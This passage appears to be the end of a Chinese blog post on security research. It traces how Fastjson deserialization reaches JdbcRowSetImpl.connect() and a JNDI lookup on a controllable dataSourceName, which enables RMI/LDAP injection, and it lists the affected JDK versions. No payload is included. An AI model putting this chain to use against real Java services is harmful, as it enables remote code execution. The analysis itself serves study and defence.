class="keyword">this</span>.fieldInfo.name, value);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.setValue(object, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>熟悉的setValue反射调用method</p>
<p><img src="https://s1.ax1x.com/2020/09/24/wxgacD.png" alt="wxgacD.png"></p>
<p>跟进所反射的方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAutoCommit</span><span class="params">(<span class="keyword">boolean</span> var1)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.conn != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.conn.setAutoCommit(var1);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.conn = <span class="keyword">this</span>.connect();</span><br><span class="line">        <span class="keyword">this</span>.conn.setAutoCommit(var1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进connect</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">private</span> Connection <span class="title">connect</span><span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.conn != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.conn;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.getDataSourceName() != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                InitialContext var1 = <span class="keyword">new</span> InitialContext();</span><br><span class="line">➡️                DataSource var2 = (DataSource)var1.lookup(<span class="keyword">this</span>.getDataSourceName());</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">this</span>.getUsername() != <span class="keyword">null</span> &amp;&amp; !<span class="keyword">this</span>.getUsername().equals(<span class="string">""</span>) ? var2.getConnection(<span class="keyword">this</span>.getUsername(), <span class="keyword">this</span>.getPassword()) : var2.getConnection();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NamingException var3) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> SQLException(<span class="keyword">this</span>.resBundle.handleGetObject(<span class="string">"jdbcrowsetimpl.connect"</span>).toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.getUrl() != <span class="keyword">null</span> ? DriverManager.getConnection(<span class="keyword">this</span>.getUrl(), <span class="keyword">this</span>.getUsername(), <span class="keyword">this</span>.getPassword()) : <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在上面我们通过setDataSourceName函数进行了变量设置</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDataSourceName</span><span class="params">(String var1)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.getDataSourceName() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">this</span>.getDataSourceName().equals(var1)) &#123;</span><br><span class="line">            <span class="keyword">super</span>.setDataSourceName(var1);</span><br><span class="line">            <span class="keyword">this</span>.conn = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">this</span>.ps = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">this</span>.rs = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">super</span>.setDataSourceName(var1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所有这里变量可控，即可造成rmi/ldap注入，完成调用</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>相比来看，TemplateImpl这条利用链是有一定的限制的，还要设置Feature.SupportNonPublicField这个条件才能触发</p>
<p>对于JdbcRowSetImpl这条链来讲，更多的限制体现在jdk版本的限制，在高版本下是有对rmi以及Idap注入的限制的</p>
<p>基于RMI利用的JDK版本&lt;=6u141、7u131、8u121，基于LDAP利用的JDK版本&lt;=6u211、7u201、8u191，不过如果环境本身classpath存在可利用的Gadgets，也是可以利用的。</p>
<p>版本的限制影响如下</p>
<p><img src="https://s1.ax1x.com/2020/09/24/wzt5Of.jpg" alt="wzt5Of.jpg"></p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="http://xxlegend.com/2017/12/06/%E5%9F%BA%E4%BA%8EJdbcRowSetImpl%E7%9A%84Fastjson%20RCE%20PoC%E6%9E%84%E9%80%A0%E4%B8%8E%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">http://xxlegend.com/2017/12/06/%E5%9F%BA%E4%BA%8EJdbcRowSetImpl%E7%9A%84Fastjson%20RCE%20PoC%E6%9E%84%E9%80%A0%E4%B8%8E%E5%88%86%E6%9E%90/</a></p>
<p><a href="https://xz.aliyun.com/t/6633" target="_blank" rel="noopener">https://xz.aliyun.com/t/6633</a></p>
]]></content>
      <tags>
        <tag>fastjson</tag>
        <tag>java</tag>
      </tags>
  </entry>
</search>
